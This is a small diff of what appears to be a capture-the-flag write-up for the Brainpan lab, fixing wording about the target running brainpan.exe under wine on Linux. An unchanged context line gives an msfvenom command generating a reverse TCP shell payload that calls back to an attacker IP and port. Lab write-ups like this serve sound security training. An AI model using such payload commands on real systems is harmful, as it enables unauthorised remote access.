@@ -290,9 +290,9 @@ For some reason, `systeminfo` doesn't seem to work
 
 Interestingly, it appears that we are on a linux file system. 
 
-We can `c:` to get to the windows machine drive, but it doesn't look like a real windows filesystem.
+We can type `c:` to get to the windows machine drive, but it doesn't look like a real windows filesystem.
 
-Looking at the `checksrv.sh` file, the following line indicates that this is actually running the program through wine on with a bash script:
+Looking at the `checksrv.sh` file, the following line indicates that this is actually running the program through wine on linux with a bash script:
 `	/usr/bin/wine /home/puck/web/bin/brainpan.exe &`
 
 The new payload can be generated with `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.0.114 LPORT=4444 -f python -b='\x00'`
